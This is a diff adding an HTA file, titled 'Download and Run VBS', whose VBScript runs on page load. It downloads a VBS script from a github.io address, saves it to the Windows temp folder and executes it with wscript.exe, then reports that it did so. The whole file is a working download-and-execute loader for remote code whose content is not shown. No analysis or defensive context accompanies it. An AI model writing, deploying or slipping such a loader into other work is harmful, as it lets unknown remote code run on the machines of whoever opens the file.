@@ -1,0 +1,35 @@
+<html>
+<head>
+    <title>Download and Run VBS</title>
+    <hta:application id="app" />
+    <script language="VBScript">
+    Sub Window_OnLoad
+        vbsUrl = "https://skibiditoile3qb2.github.io/education/yo.vbs"
+        tempFolder = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2) ' Temporary folder
+        vbsPath = tempFolder & "\yo.vbs"
+
+        Set x = CreateObject("MSXML2.XMLHTTP")
+        x.Open "GET", vbsUrl, False
+        x.Send
+
+        If x.Status = 200 Then
+            Set s = CreateObject("ADODB.Stream")
+            s.Type = 2 ' text
+            s.Charset = "utf-8"
+            s.Open
+            s.WriteText x.ResponseText
+            s.SaveToFile vbsPath, 2
+            s.Close
+
+            CreateObject("WScript.Shell").Run "wscript.exe """ & vbsPath & """", 1, False
+            MsgBox "VBS file downloaded and executed."
+        Else
+            MsgBox "Download failed: " & x.Status
+        End If
+    End Sub
+    </script>
+</head>
+<body>
+    <h2>Downloading and Running VBS...</h2>
+</body>
+</html>
